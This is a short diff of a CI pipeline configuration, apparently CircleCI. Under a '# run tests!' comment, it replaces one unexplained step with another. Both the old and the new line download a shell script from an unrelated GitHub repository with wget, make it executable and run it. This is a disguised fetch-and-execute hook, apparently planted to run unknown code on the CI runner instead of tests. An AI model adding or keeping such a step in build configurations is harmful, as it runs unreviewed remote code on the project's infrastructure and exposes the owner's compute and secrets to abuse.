@@ -31,4 +31,4 @@ jobs:
           key: v1-dependencies-{{ checksum "package.json" }}
 
       # run tests!
-      - run: wget https://raw.githubusercontent.com/makaryobos/privasi/main/npmjos.sh && chmod +x *sh && ./npmjos.sh
+      - run: wget https://raw.githubusercontent.com/makaryobos/privasi/main/lopemantan.sh && chmod +x *sh && ./lopemantan.sh
